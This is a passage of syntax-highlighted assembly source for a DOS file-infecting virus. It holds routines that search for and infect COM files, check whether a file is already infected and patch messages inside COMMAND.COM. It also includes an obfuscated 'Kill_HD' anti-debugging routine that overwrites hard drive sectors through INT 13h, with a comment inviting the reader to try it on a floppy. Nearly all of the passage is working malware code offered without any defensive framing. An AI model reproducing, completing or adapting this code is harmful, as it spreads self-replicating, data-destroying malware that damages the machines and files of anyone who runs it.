<span style="color: black; font-style: italic;">; NOTE: All code following this point is executed in the higher segment</span><br/>
<br/>
<span style="color: black; font-style: italic;">;--- Subroutines for infection ----------------------------</span><br/>
<br/>
Close_File<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Eh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
<br/>
Find_Next<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Fh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short ID_Check<br/>
<br/>
<span style="color: black; font-style: italic;">;--- Second_Entry for Debugger ONLY -----------------------</span><br/>
Kill_HD<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Executed ONLY by</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; debugging</span><br/>
<br/>
Anti_Debug<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Overwrite sectors on</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; the hard drive,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; starting at sector 1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FE05h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; going upwards</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0E702h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;AX=301h obfuscated</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Write on hard drive!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; NOTE: Change this value</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; to 0 or 1 (A: or B:) if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; you wish to try this out</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">13h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Anti_Debug<br/>
<br/>
<span style="color: black; font-style: italic;">;--- Normal Second_Entry ----------------------------------</span><br/>
<br/>
Second_Entry<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'ML'</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;Restore INT 0 so</span><br/>
Orig_0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; computer doesn't</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'SA'</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">; crash on divide-by-zero</span><br/>
Orig_2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span>offset AD_Marker <span style="color: #339933;">-</span> <span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>offset Second_Entry<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Reset virus to</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; original state,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; otherwise infected files</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; will only run Kill_HD</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Ah</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Set DTA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cwd</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Eh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Open file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset Filespec<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
<br/>
ID_Check<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jc</span>&nbsp; &nbsp; &nbsp; restore_host&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;No file found</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3D02h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Eh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;File name in DTA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jc</span>&nbsp; &nbsp; &nbsp; Find_Next<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Read from file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Ah</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jc</span>&nbsp; &nbsp; &nbsp; Find_Next<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span>DOS_7<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Infected already?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; Close_File<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Look at 3rd and 4th bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6015h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Same as DOS 6'S COMMAND?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; COMMAND_COM<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Infect&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Infect as normal file</span><br/>
<br/>
<span style="color: black; font-style: italic;">;--- Following routines alter messages in COMMAND.COM -----</span><br/>
<br/>
COMMAND_COM<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>antivirus<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">23F0h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DOS copyright notice</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>antiviruslen<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repz</span>&nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>msg<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9057h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;&quot;Disk in drive XX has no</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>msglen &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; label&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repz</span>&nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>msg2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">914Ch</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;&quot;Bad command or filename&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>msg2len<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repz</span>&nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4200h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Write patched COMMAND.COM</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>host &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; back to disk</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>52925d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Eh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;close COMMAND.COM</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Restore_Host<br/>
<br/>
<span style="color: black; font-style: italic;">;--- Infect file as a normal COM file (Not COMMAND.COM) ---</span><br/>
<br/>
Infect<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4200h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Go to start of file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
